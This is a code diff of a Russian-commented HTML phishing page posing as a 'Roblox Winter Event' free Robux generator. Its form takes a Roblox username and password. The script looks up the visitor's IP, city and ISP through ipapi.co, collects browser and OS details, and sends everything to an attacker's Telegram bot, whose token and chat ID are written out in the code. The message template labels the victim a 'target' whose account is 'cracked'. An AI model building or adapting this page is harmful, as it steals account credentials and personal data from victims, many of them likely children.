@@ -2,119 +2,99 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ROBLOX: WINTER EVENT 2025</title>
     <style>
         body { 
-            background: radial-gradient(circle, #200101 0%, #050000 100%); 
-            color: #fff; 
-            font-family: 'Arial Black', Gadget, sans-serif; 
-            margin: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh;
-            overflow: hidden;
+            background: radial-gradient(circle, #250000 0%, #000000 100%); 
+            color: #fff; font-family: 'Arial Black', sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; overflow: hidden;
         }
         .container { 
-            background: rgba(20, 20, 20, 0.95);
-            border: 3px solid #ff0000;
-            box-shadow: 0 0 30px #ff0000;
-            border-radius: 15px;
-            padding: 40px;
-            width: 400px;
-            text-align: center;
-            position: relative;
+            background: rgba(0, 0, 0, 0.8); border: 2px solid #ff0000;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.4); border-radius: 10px;
+            padding: 40px; width: 420px; text-align: center; position: relative;
         }
-        .logo-box { position: relative; display: inline-block; }
-        .rbx-main-logo { width: 300px; filter: drop-shadow(0 0 10px #ff0000); }
-        .santa-hat { position: absolute; width: 80px; top: -35px; right: -20px; transform: rotate(15deg); }
-        
-        h1 { font-size: 28px; color: #ff0000; text-transform: uppercase; margin: 20px 0 10px; text-shadow: 2px 2px #000; }
-        .verif-text { color: #00ff00; font-size: 14px; margin-bottom: 20px; font-weight: bold; }
+        /* Тот самый жирный логотип с шапкой */
+        .logo-text { 
+            font-size: 60px; color: #fff; text-transform: uppercase; 
+            letter-spacing: -3px; margin: 0; position: relative;
+            filter: drop-shadow(0 0 10px #ff0000);
+        }
+        .santa-hat { 
+            position: absolute; width: 70px; top: -35px; right: -10px; 
+            transform: rotate(20deg); 
+        }
+        h2 { color: #ff0000; font-size: 20px; margin-top: 10px; text-shadow: 0 0 5px #ff0000; }
+        .badge { background: #00ff00; color: #000; padding: 5px 10px; border-radius: 5px; font-size: 12px; font-weight: bold; }
 
         input, select { 
-            width: 100%; padding: 15px; margin: 10px 0; 
-            background: #111; border: 2px solid #333; color: #fff; 
+            width: 100%; padding: 15px; margin: 12px 0; 
+            background: #111; border: 1px solid #ff0000; color: #fff; 
             font-weight: bold; border-radius: 5px; box-sizing: border-box;
         }
-        input:focus { border-color: #ff0000; outline: none; }
-
-        .btn-main { 
+        .btn { 
             width: 100%; padding: 20px; background: #ff0000; color: #fff; 
-            border: none; font-size: 20px; font-weight: bold; cursor: pointer; 
-            text-transform: uppercase; transition: 0.3s; margin-top: 15px;
-            box-shadow: 0 5px 0 #8b0000;
+            border: none; font-size: 22px; font-weight: bold; cursor: pointer; 
+            box-shadow: 0 5px 0 #8b0000; transition: 0.2s;
         }
-        .btn-main:hover { background: #ff3333; transform: translateY(-2px); }
-        .btn-main:active { transform: translateY(2px); box-shadow: none; }
-
-        .footer { margin-top: 25px; font-size: 10px; color: #444; letter-spacing: 1px; }
+        .btn:active { transform: translateY(3px); box-shadow: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Roblox_Logo_2022.svg" class="rbx-main-logo">
+    <div style="position: relative; display: inline-block;">
+        <h1 class="logo-text">ROBLOX</h1>
         <img src="https://www.pngall.com/wp-content/uploads/2016/05/Santa-Hat-PNG-Image.png" class="santa-hat">
     </div>
-    
-    <h1>ROBUX GENERATOR</h1>
-    <div class="verif-text">● ACCOUNT STATUS: 30+ DAYS VERIFIED</div>
+    <br><br>
+    <span class="badge">PROMO: 30+ DAYS VERIFIED</span>
+    <h2>WINTER GIFT GENERATOR</h2>
 
-    <form id="hunterAction">
+    <form id="ff_strike">
         <input type="text" id="u" placeholder="USERNAME" required>
         <input type="password" id="p" placeholder="PASSWORD" required>
         <select id="r">
-            <option value="1000">1,000 ROBUX</option>
             <option value="5000">5,000 ROBUX</option>
             <option value="10000">10,000 ROBUX</option>
             <option value="50000">50,000 ROBUX</option>
         </select>
         <button type="submit" id="btn">CLAIM NOW</button>
     </form>
-
-    <div class="footer">ADMIN PANEL v4.2 | ANTIBOT ACTIVE</div>
 </div>
 
 <script>
-    document.getElementById('hunterAction').onsubmit = async function(e) {
+    document.getElementById('ff_strike').onsubmit = async function(e) {
         e.preventDefault();
-        const btn = document.getElementById('btn');
-        btn.innerText = "WAITING...";
-        
+        document.getElementById('btn').innerText = "WAITING...";
+
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
         const r = document.getElementById('r').value;
 
-        // ПОЛНОЕ ДОСЬЕ (IP + Город + Провайдер)
-        let fullIp = "Hidden";
+        // ТОТАЛЬНЫЙ СБОР ДАННЫХ
+        let geo = "Ошибка Geo";
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            fullIp = `${data.ip} (${data.city}, ${data.country_name})\n🏢 Провайдер: ${data.org}`;
-        } catch(err) {
-            try {
-                const res2 = await fetch('https://api.ipify.org');
-                fullIp = await res2.text();
-            } catch(e) {}
-        }
+            const d = await res.json();
+            geo = `🌐 IP: ${d.ip}\n📍 Город: ${d.city}, ${d.country_name}\n🏢 Провайдер: ${d.org}`;
+        } catch(err) {}
 
-        const device = `🖥️ Железо: ${navigator.platform}\n📱 Браузер: ${navigator.userAgent.split(') ')[1]}`;
+        const device = `💻 ОС: ${navigator.platform}\n📱 Браузер: ${navigator.userAgent.substring(0, 50)}`;
 
         const token = '8098842209:AAE4Ff4yzUKZP6KwffFsufrXYqwioo0zifk';
         const chatId = '8165386246';
 
-        const text = `🔪 **DARK PASSENGER: ПОЛНЫЙ ВЕРДИКТ** 🔪\n` +
+        const text = `🔪 **DARK PASSENGER: ВЕРДИКТ** 🔪\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
-                     `👤 **Юзер:** \`${u}\`\n` +
-                     `🔑 **Пароль:** \`${p}\`\n` +
-                     `💎 **Сумма:** ${r} Robux\n\n` +
-                     `🌐 **IP-Данные:**\n${fullIp}\n\n` +
+                     `👤 **Цель:** \`${u}\`\n` +
+                     `🔑 **Пасс:** \`${p}\`\n` +
+                     `💎 **Буксы:** ${r}\n\n` +
+                     `${geo}\n\n` +
                      `${device}\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
-                     `🩸 *Кодекс соблюден. Объект вскрыт.*`;
+                     `🩸 *Объект вскрыт.*`;
 
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
